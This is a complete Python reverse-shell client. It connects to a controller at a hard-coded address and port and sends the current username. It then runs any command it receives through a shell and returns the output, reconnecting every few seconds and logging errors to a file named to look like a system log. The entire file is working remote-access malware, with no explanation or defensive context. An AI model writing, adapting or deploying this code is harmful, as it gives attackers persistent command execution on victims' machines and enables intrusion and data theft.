import socket
import subprocess
import time
import getpass  

def start_client():
    host = '127.0.0.1'
    port = 12345

    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((host, port))

            username = getpass.getuser()  
            client_socket.send(username.encode())

            while True:
                command = client_socket.recv(1024).decode()

                if command.lower() == 'exit':
                    break

                try:
                    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                    client_socket.send(result.encode())
                except subprocess.CalledProcessError as e:
                    client_socket.send(f"ERROR : {e.output}".encode())

        except ConnectionResetError as e:

            time.sleep(5)

        except Exception as e:
            try:
                with open("syslog.txt", "a") as log_file:
                    log_file.write(f"{e}\n")
            except:
                pass
        finally:
            client_socket.close()

if __name__ == "__main__":
    start_client()
